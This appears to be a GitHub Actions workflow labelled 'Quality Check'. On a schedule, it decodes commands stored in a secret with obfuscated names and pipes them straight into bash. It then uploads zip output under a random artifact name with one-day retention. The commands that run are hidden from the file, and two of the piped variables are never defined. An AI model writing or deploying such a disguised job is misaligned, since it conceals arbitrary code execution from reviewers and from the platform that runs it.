name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '1 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  pipeline:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          zfe49250: ${{ secrets.zfe49250 }}
        run: |
          printf '%s' "$zfe49250" | jq -r .uxwbm6 | /bin/bash
          echo $zp76 | jq -r .dhik9 | /bin/bash
          printf '%s' "$vela1251" | jq -r .ue5 | /bin/bash

      - name: Persist output
        if: ${{ always() }}
        uses: actions/upload-artifact@v4
        with:
          name: HCO5UgGH
          path: "*.zip"
          retention-days: 1
